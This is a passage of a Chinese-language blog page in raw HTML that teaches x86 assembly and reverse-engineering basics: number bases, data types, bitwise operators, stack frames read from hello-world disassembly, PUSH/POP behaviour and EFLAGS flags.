&lt;stdio.h&gt;</span><br><span class=\"line\">BOOL CreateSampleService()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    TCHAR szPath[MAX_PATH];</span><br><span class=\"line\">    if( !GetModuleFileName( NULL, szPath, MAX_PATH ) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        printf(&quot;GetModuleFileName failed (%d)\\n&quot;, GetLastError());</span><br><span class=\"line\">        return FALSE;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">return TRUE;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">如果想获得某个正在运行的EXE或者DLL的全路径可以这样写代码</span><br><span class=\"line\">GetModuleFileNameEx(hProcess,hInst,lpFile,MAX_PATH);//注意下缓冲区就行了。</span><br></pre></td></tr></table></figure>\n<h2 id=\"c语言\"><a class=\"markdownIt-Anchor\" href=\"#c语言\">#</a> C 语言</h2>\n<h3 id=\"进制转换\"><a class=\"markdownIt-Anchor\" href=\"#进制转换\">#</a> 进制转换</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">十进制的定义：由十个符号组成，分别是0 1 2 3 4 5 6 7 8 9 逢十进一</span><br><span class=\"line\">九进制的定义：由九个符号组成，分别是0 1 2 3 4 5 6 7 8 逢九进一</span><br><span class=\"line\">十六进制的定义：由十六个符号组成，分别是0 1 2 3 4 5 6 7 8 9 A B C D E F</span><br><span class=\"line\">N进制的定义：由N个符号组成 逢N进一</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/c7f63c451ccc451ab28baad170247bcd.png\" alt=\"img\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/8152a3f7846a4908857796b308186582.png\" alt=\"img\"></p>\n<h3 id=\"数据类型\"><a class=\"markdownIt-Anchor\" href=\"#数据类型\">#</a> 数据类型</h3>\n<p>在计算机中，由于硬件的制约，数据是有长度限制的，超过数据宽度的数据会被丢弃。如果没有长度限制，会产生溢出</p>\n<p>同一个数据，表示无符号数和有符号数则其含义不同</p>\n<ol>\n<li>无符号数：正数</li>\n<li>有符号数：正数、负数</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">无符号数：</span><br><span class=\"line\">数据0123456789101112131415十六进制0123456789ABCDEF二进制0000000100100011010001010110011110001001101010111100110111101111</span><br><span class=\"line\"></span><br><span class=\"line\">有符号数：</span><br><span class=\"line\">正数：</span><br><span class=\"line\">数据01234567十六进制01234567二进制00001001000110100010101100111</span><br><span class=\"line\">负数：</span><br><span class=\"line\">数据-1-2-3-4-5-6-7-8十六进制FEDCBA98二进制11111110110111001011101010011000</span><br><span class=\"line\">可以发现当数据为1011，把数据看作无符号数时，数据表示为B</span><br><span class=\"line\">把数据看作有符号数时，数据表示为-5</span><br><span class=\"line\">无符号数的表示范围为0～2^4-1即0～15\\\\ 有符号数的表示范围为-2^3～2^3-1即-8～7</span><br></pre></td></tr></table></figure>\n<h4 id=\"常见的数据类型\"><a class=\"markdownIt-Anchor\" href=\"#常见的数据类型\">#</a> 常见的数据类型</h4>\n<ul>\n<li>BYTE             字节      8BIT</li>\n<li>WORD           字       16BIT 2 字节</li>\n<li>DWORD       双字      32BIT 4 字节</li>\n</ul>\n<h4 id=\"常见的运算符类型重要\"><a class=\"markdownIt-Anchor\" href=\"#常见的运算符类型重要\">#</a> 常见的运算符类型（重要）</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">或运算（or |）</span><br><span class=\"line\">只要有一个为1则结果为1</span><br><span class=\"line\">与运算（and &amp;）</span><br><span class=\"line\">两个都是1结果才为1</span><br><span class=\"line\">异或运算（xor ^）</span><br><span class=\"line\">相同为0 不同为1</span><br><span class=\"line\">非运算(not !)</span><br><span class=\"line\">取反 1是0 0是1</span><br></pre></td></tr></table></figure>\n<h3 id=\"堆栈\"><a class=\"markdownIt-Anchor\" href=\"#堆栈\">#</a> 堆栈</h3>\n<p>临时存放一些寄存器已无法存放的数据，比如超过内存对齐的数据类型</p>\n<h4 id=\"hello-world\"><a class=\"markdownIt-Anchor\" href=\"#hello-world\">#</a> hello world</h4>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Hello World!\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">00401010</span> &gt;|&gt; \\<span class=\"number\">55</span>            push    ebp</span><br><span class=\"line\"><span class=\"number\">00401011</span>  |.  <span class=\"number\">8B</span>EC          mov     ebp,esp</span><br><span class=\"line\"><span class=\"number\">00401013</span>  |.  <span class=\"number\">83</span>EC <span class=\"number\">40</span>       sub     esp,<span class=\"number\">0x40</span></span><br><span class=\"line\"><span class=\"number\">00401016</span>  |.  <span class=\"number\">53</span>            push    ebx</span><br><span class=\"line\"><span class=\"number\">00401017</span>  |.  <span class=\"number\">56</span>            push    esi</span><br><span class=\"line\"><span class=\"number\">00401018</span>  |.  <span class=\"number\">57</span>            push    edi</span><br><span class=\"line\"><span class=\"number\">00401019</span>  |.  <span class=\"number\">8</span>D7D C0       lea     edi,[local<span class=\"number\">.16</span>]</span><br><span class=\"line\"><span class=\"number\">0040101</span>C  |.  B9 <span class=\"number\">10000000</span>   mov     ecx,<span class=\"number\">0x10</span></span><br><span class=\"line\"><span class=\"number\">00401021</span>  |.  B8 CCCCCCCC   mov     eax,<span class=\"number\">0xCCCCCCCC</span></span><br><span class=\"line\"><span class=\"number\">00401026</span>  |.  F3:AB         rep     stos dword ptr es:[edi]</span><br><span class=\"line\"><span class=\"number\">00401028</span>  |.  <span class=\"number\">68</span> <span class=\"number\">1</span>C204200   push    <span class=\"number\">0042201</span>C                         ; /format = <span class=\"string\">&quot;Hello World!</span></span><br><span class=\"line\"><span class=\"string\">0040102D  |.  E8 2E000000   call    printf                           ; \\printf</span></span><br><span class=\"line\"><span class=\"string\">00401032  |.  83C4 04       add     esp,0x4</span></span><br><span class=\"line\"><span class=\"string\">00401035  |.  33C0          xor     eax,eax</span></span><br><span class=\"line\"><span class=\"string\">00401037  |.  5F            pop     edi</span></span><br><span class=\"line\"><span class=\"string\">00401038  |.  5E            pop     esi</span></span><br><span class=\"line\"><span class=\"string\">00401039  |.  5B            pop     ebx</span></span><br><span class=\"line\"><span class=\"string\">0040103A  |.  83C4 40       add     esp,0x40</span></span><br><span class=\"line\"><span class=\"string\">0040103D  |.  3BEC          cmp     ebp,esp</span></span><br><span class=\"line\"><span class=\"string\">0040103F  |.  E8 9C000000   call    _chkesp</span></span><br><span class=\"line\"><span class=\"string\">00401044  |.  8BE5          mov     esp,ebp</span></span><br><span class=\"line\"><span class=\"string\">00401046  |.  5D            pop     ebp</span></span><br><span class=\"line\"><span class=\"string\">00401047  \\.  C3            retn</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\"></span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;windows.h&quot;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tTCHAR string123[<span class=\"number\">100</span>] = &#123;<span class=\"string\">&quot;Hello World!\\0&quot;</span>&#125;;</span><br><span class=\"line\">\t<span class=\"comment\">//printf(&quot;%s\\n&quot;,string123);</span></span><br><span class=\"line\">\t<span class=\"comment\">//printf(&quot;Hello World!\\n&quot;);</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0040</span>D6F0 &gt;/&gt; \\<span class=\"number\">55</span>                  push    ebp</span><br><span class=\"line\"><span class=\"number\">0040</span>D6F1  |.  <span class=\"number\">8B</span>EC                mov     ebp,esp</span><br><span class=\"line\"><span class=\"number\">0040</span>D6F3  |.  <span class=\"number\">81</span>EC A4000000       sub     esp,<span class=\"number\">0xA4</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D6F9  |.  <span class=\"number\">53</span>                  push    ebx</span><br><span class=\"line\"><span class=\"number\">0040</span>D6FA  |.  <span class=\"number\">56</span>                  push    esi</span><br><span class=\"line\"><span class=\"number\">0040</span>D6FB  |.  <span class=\"number\">57</span>                  push    edi</span><br><span class=\"line\"><span class=\"number\">0040</span>D6FC  |.  <span class=\"number\">8</span>DBD <span class=\"number\">5</span>CFFFFFF       lea     edi,[local<span class=\"number\">.41</span>]</span><br><span class=\"line\"><span class=\"number\">0040</span>D702  |.  B9 <span class=\"number\">29000000</span>         mov     ecx,<span class=\"number\">0x29</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D707  |.  B8 CCCCCCCC         mov     eax,<span class=\"number\">0xCCCCCCCC</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D70C  |.  F3:AB               rep     stos dword ptr es:[edi]</span><br><span class=\"line\"><span class=\"number\">0040</span>D70E  |.  A1 <span class=\"number\">1</span>C204200         mov     eax,dword ptr ds:[<span class=\"number\">0x42201C</span>]</span><br><span class=\"line\"><span class=\"number\">0040</span>D713  |.  <span class=\"number\">8945</span> <span class=\"number\">9</span>C             mov     [local<span class=\"number\">.25</span>],eax</span><br><span class=\"line\"><span class=\"number\">0040</span>D716  |.  <span class=\"number\">8B</span>0D <span class=\"number\">20204200</span>       mov     ecx,dword ptr ds:[<span class=\"number\">0x422020</span>]</span><br><span class=\"line\"><span class=\"number\">0040</span>D71C  |.  <span class=\"number\">894</span>D A0             mov     [local<span class=\"number\">.24</span>],ecx</span><br><span class=\"line\"><span class=\"number\">0040</span>D71F  |.  <span class=\"number\">8B</span>15 <span class=\"number\">24204200</span>       mov     edx,dword ptr ds:[<span class=\"number\">0x422024</span>]</span><br><span class=\"line\"><span class=\"number\">0040</span>D725  |.  <span class=\"number\">8955</span> A4             mov     [local<span class=\"number\">.23</span>],edx</span><br><span class=\"line\"><span class=\"number\">0040</span>D728  |.  <span class=\"number\">66</span>:A1 <span class=\"number\">28204200</span>      mov     ax,word ptr ds:[<span class=\"number\">0x422028</span>]</span><br><span class=\"line\"><span class=\"number\">0040</span>D72E  |.  <span class=\"number\">66</span>:<span class=\"number\">8945</span> A8          mov     word ptr ss:[ebp<span class=\"number\">-0x58</span>],ax</span><br><span class=\"line\"><span class=\"number\">0040</span>D732  |.  B9 <span class=\"number\">15000000</span>         mov     ecx,<span class=\"number\">0x15</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D737  |.  <span class=\"number\">33</span>C0                <span class=\"keyword\">xor</span>     eax,eax</span><br><span class=\"line\"><span class=\"number\">0040</span>D739  |.  <span class=\"number\">8</span>D7D AA             lea     edi,dword ptr ss:[ebp<span class=\"number\">-0x56</span>]</span><br><span class=\"line\"><span class=\"number\">0040</span>D73C  |.  F3:AB               rep     stos dword ptr es:[edi]</span><br><span class=\"line\"><span class=\"number\">0040</span>D73E  |.  <span class=\"number\">66</span>:AB               stos    word ptr es:[edi]</span><br><span class=\"line\"><span class=\"number\">0040</span>D740  |.  <span class=\"number\">33</span>C0                <span class=\"keyword\">xor</span>     eax,eax</span><br><span class=\"line\"><span class=\"number\">0040</span>D742  |.  <span class=\"number\">5F</span>                  pop     edi</span><br><span class=\"line\"><span class=\"number\">0040</span>D743  |.  <span class=\"number\">5</span>E                  pop     esi</span><br><span class=\"line\"><span class=\"number\">0040</span>D744  |.  <span class=\"number\">5B</span>                  pop     ebx</span><br><span class=\"line\"><span class=\"number\">0040</span>D745  |.  <span class=\"number\">8B</span>E5                mov     esp,ebp</span><br><span class=\"line\"><span class=\"number\">0040</span>D747  |.  <span class=\"number\">5</span>D                  pop     ebp</span><br><span class=\"line\"><span class=\"number\">0040</span>D748  \\.  C3                  retn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>Windows 分配栈时 是从高地址往低地址分配:</p>\n<ol>\n<li>MOV EBX,0x13FFDC     BASE</li>\n<li>MOV EDX,0x13FFDC     TOP</li>\n</ol>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230916132649432.png\" alt=\"image-20230916132649432\"></p>\n<p>符号含义 r 寄存器 m 内存 imm 立即数 r88 位通用寄存器 m88 位内存 imm88 位立即数</p>\n<h4 id=\"push指令\"><a class=\"markdownIt-Anchor\" href=\"#push指令\">#</a> PUSH 指令</h4>\n<p>PUSH r32</p>\n<p>PUSH r16</p>\n<p>PUSH m16</p>\n<p>PUSH m32</p>\n<p>PUSH imm8/imm16/imm32</p>\n<h5 id=\"所有的push都是将esp-4\"><a class=\"markdownIt-Anchor\" href=\"#所有的push都是将esp-4\">#</a> 所有的 push 都是将 esp-4?</h5>\n<p>压入的数据的<strong>数据宽度：</strong></p>\n<p>当 push 的是立即数将 esp-4</p>\n<p>当 push r32 如 push eax 时将 esp-4</p>\n<p>当 push dword ptr ds:[12FFDA] 即压入双字内存地址中的数据时将 esp-4</p>\n<p>当 push word ptr ds:[12FFDA] 即压入字内存地址中的数据时将 esp-2</p>\n<p>当 push ax，即 r16 ，16 位通用寄存器时，esp-2</p>\n<p>push <strong>不允许压入数据宽度为 8</strong> 的数据 如 ah al 和 byte ptr ds:[内存编号]</p>\n<h4 id=\"pop指令\"><a class=\"markdownIt-Anchor\" href=\"#pop指令\">#</a> POP 指令</h4>\n<p>POP r32</p>\n<p>POP r16</p>\n<p>POP m16</p>\n<p>POP m32</p>\n<h4 id=\"pushad和popad指令\"><a class=\"markdownIt-Anchor\" href=\"#pushad和popad指令\">#</a> PUSHAD 和 POPAD 指令</h4>\n<p>将所有的 32 位通用寄存器压入堆栈，方便后面随意使用寄存器，用于保护现场</p>\n<p>与 POPAD 对应</p>\n<h4 id=\"pushfd和popfd指令\"><a class=\"markdownIt-Anchor\" href=\"#pushfd和popfd指令\">#</a> PUSHFD 和 POPFD 指令</h4>\n<p>然后将 32 位标志寄存器 EFLAGS 压入堆栈</p>\n<p>与 POPAD 对应</p>\n<h4 id=\"其它相关指令\"><a class=\"markdownIt-Anchor\" href=\"#其它相关指令\">#</a> 其它相关指令</h4>\n<p>pusha: 将所有的 16 位通用寄存器压入堆栈</p>\n<p>popa: 将所有的 16 位通用寄存器取出堆栈</p>\n<p>pushf:: 将的 16 位标志寄存器 EFLAGS 压入堆栈</p>\n<p>popf: 将 16 位标志寄存器 EFLAGS 取出堆栈</p>\n<p>栈底和栈顶原理：</p>\n<ol>\n<li>控制栈顶和栈底分别为两个固定的寄存器 (EBP 基址指针寄存器 和 ESP 堆栈指针寄存器）</li>\n<li>刚开始堆栈为空，栈顶和栈底相同</li>\n</ol>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230916133004633.png\" alt=\"image-20230916133004633\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230916133048269.png\" alt=\"image-20230916133048269\"></p>\n<p>ebp - 4 函数中的局部变量</p>\n<p>ebp+8  函数传入参数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">提升堆栈</span><br><span class=\"line\">对应语句为</span><br><span class=\"line\">00401040  /&gt; \\55            push ebp</span><br><span class=\"line\">00401041  |.  8BEC          mov ebp,esp</span><br><span class=\"line\">00401043  |.  83EC 40       sub esp,0x40</span><br><span class=\"line\"></span><br><span class=\"line\">将堆栈提升了0x40</span><br><span class=\"line\"></span><br><span class=\"line\">保护现场</span><br><span class=\"line\">对应语句为</span><br><span class=\"line\">00401046  |.  53            push ebx</span><br><span class=\"line\">00401047  |.  56            push esi</span><br><span class=\"line\">00401048  |.  57            push edi</span><br><span class=\"line\"></span><br><span class=\"line\">将ebx、esi、edi三个通用寄存器保存到堆栈中，前面的push ebp其实也属于保护现场</span><br><span class=\"line\"></span><br><span class=\"line\">初始化提升的堆栈</span><br><span class=\"line\">00401049  |.  8D7D C0       lea edi,dword ptr ss:[ebp-0x40]</span><br><span class=\"line\">0040104C  |.  B9 10000000   mov ecx,0x10</span><br><span class=\"line\">00401051  |.  B8 CCCCCCCC   mov eax,0xCCCCCCCC</span><br><span class=\"line\">00401056  |.  F3:AB         rep stos dword ptr es:[edi]</span><br><span class=\"line\"></span><br><span class=\"line\">这里将我们提升的堆栈中的内容全部初始化为CCCCCCCC</span><br><span class=\"line\"></span><br><span class=\"line\">为什么是初始化为CC？防止缓冲溢出</span><br><span class=\"line\"></span><br><span class=\"line\">CC的硬编码对应的指令为int 3，即断点</span><br><span class=\"line\"></span><br><span class=\"line\">这么做有什么好处呢？当程序执行超过缓冲区时，遇到int 3就会自动停下来</span><br><span class=\"line\"></span><br><span class=\"line\">执行实际的内容</span><br><span class=\"line\">对应语句为</span><br><span class=\"line\">00401058  |.  8B45 08       mov eax,dword ptr ss:[ebp+0x8]</span><br><span class=\"line\">0040105B  |.  0345 0C       add eax,dword ptr ss:[ebp+0xC]</span><br><span class=\"line\"></span><br><span class=\"line\">就是将前面压入的参数2和1进行相加得到3</span><br><span class=\"line\"></span><br><span class=\"line\">恢复现场</span><br><span class=\"line\">对应语句为</span><br><span class=\"line\">0040105E  |.  5F            pop edi                                  ;  HelloWor.00401171</span><br><span class=\"line\">0040105F  |.  5E            pop esi                                  ;  HelloWor.00401171</span><br><span class=\"line\">00401060  |.  5B            pop ebx                                  ;  HelloWor.00401171</span><br><span class=\"line\">00401061  |.  8BE5          mov esp,ebp</span><br><span class=\"line\">00401063  |.  5D            pop ebp                                  ;  HelloWor.00401171</span><br><span class=\"line\"></span><br><span class=\"line\">与前面保护现场相对应</span><br><span class=\"line\"></span><br><span class=\"line\">返回</span><br><span class=\"line\">对应语句为</span><br><span class=\"line\">00401064  \\.  C3            retn</span><br><span class=\"line\"></span><br><span class=\"line\">CALL返回后</span><br><span class=\"line\">对应语句为</span><br><span class=\"line\">00401171  |.  83C4 08       add esp,0x8</span><br><span class=\"line\"></span><br><span class=\"line\">作用为平衡堆栈</span><br></pre></td></tr></table></figure>\n<h3 id=\"标志寄存器\"><a class=\"markdownIt-Anchor\" href=\"#标志寄存器\">#</a> 标志寄存器</h3>\n<ol>\n<li>\n<p>进位标志 CF (Carry Flag)</p>\n<p>如果运算结果的<strong>最高位</strong>产生了一个进位或借位，那么，其值为 1，否则其值为 0</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">MOV AL,0xFF</span><br><span class=\"line\">ADD AL,1</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>奇偶标志 PF (Parity  Flag)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">MOV AX,803</span><br><span class=\"line\">ADD AX,1</span><br></pre></td></tr></table></figure>\n<p>执行结果</p>\n<p>0x804: 0000 1000 0000 0100     总共 2 个 1 ,PF 应为 1，但实际运行结果 PF 为 0</p>\n<p>因为 PF 是根据最低有效字节来看，即 8<strong>04</strong> 后面 04 的这部分</p>\n<p>04： 0000 0100 总共 1 个 1，所以 PF 为 0</p>\n</li>\n<li>\n<p>辅助进位标志 AF (Auxiliary  Carry Flag)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">在发生下列情况时，辅助进位标志AF的值被置为1，否则其值为0：</span><br><span class=\"line\"></span><br><span class=\"line\">在字操作时，发生低字节向高字节进位或借位时</span><br><span class=\"line\">在字节操作时，发生低4位向高4位进位或借位时</span><br><span class=\"line\"></span><br><span class=\"line\">AF与数据宽度相关</span><br><span class=\"line\"></span><br><span class=\"line\">32位时 FFFF F FFF</span><br><span class=\"line\"></span><br><span class=\"line\">16位时 FF F F</span><br><span class=\"line\"></span><br><span class=\"line\">8位时 F F</span><br><span class=\"line\"></span><br><span class=\"line\">加黑的字体为AF标志位判断的位置，如果该位置要向前进位则AF为1，否则为0，和CF相似，不过判断的位置不同 </span><br><span class=\"line\">MOV EAX,55EEFFFF</span><br><span class=\"line\"></span><br><span class=\"line\">ADD EAX,2</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>零标志 ZF (Zero  Flag)</p>\n<p>零标志 ZF 用来反映运算结果是否为 0</p>\n<p>如果运算结果为 0，则其值为 1，否则其值为 0</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">004011A6  |.  85C0                test    eax,eax</span><br><span class=\"line\">004011A8  |.  75 0A               jnz     short 004011B4</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>符号标志 SF (Sign  Flag)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">符号标志SF用来反映运算结果的符号位，它与运算结果的最高位相同</span><br><span class=\"line\">MOV AL,7F</span><br><span class=\"line\">ADD AL,2</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>溢出标志 OF (Overflow  Flag)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">溢出标志OF用于反映有符号数加减运算所得结果是否溢出</span><br><span class=\"line\"></span><br><span class=\"line\">最高位进位与溢出的区别：</span><br><span class=\"line\"></span><br><span class=\"line\">进位标志表示无符号数运算结果是否超出范围.</span><br><span class=\"line\"></span><br><span class=\"line\">溢出标志表示有符号数运算结果是否超出范围.</span><br><span class=\"line\"></span><br><span class=\"line\">溢出主要是给有符号运算使用的，在有符号的运算中，有如下的规律：</span><br><span class=\"line\"></span><br><span class=\"line\">正 + 正 = 正  如果结果是负数，则说明有溢出</span><br><span class=\"line\">负 + 负 = 负  如果结果是正数，则说明有溢出</span><br><span class=\"line\">正 + 负 永远都不会有溢出</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>方向标志 DF (Direction Flag)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DF=1时串操作为减地址方式 DF=0为增地址方式</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h5 id=\"eflags\"><a class=\"markdownIt-Anchor\" href=\"#eflags\">#</a> EFLAGS</h5>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230916140608232.png\" alt=\"image-20230916140608232\"></p>\n<p>pushfd 是 push 的 EFL 中的值，比如 00000246</p>\n<h3 id=\"条件跳转\"><a class=\"markdownIt-Anchor\" href=\"#条件跳转\">#</a> 条件跳转</h3>\n<h4 id=\"jcc指令\"><a class=\"markdownIt-Anchor\" href=\"#jcc指令\">#</a> JCC 指令</h4>\n<p>cc 代表 condition code (状态码)</p>\n<p>Jcc 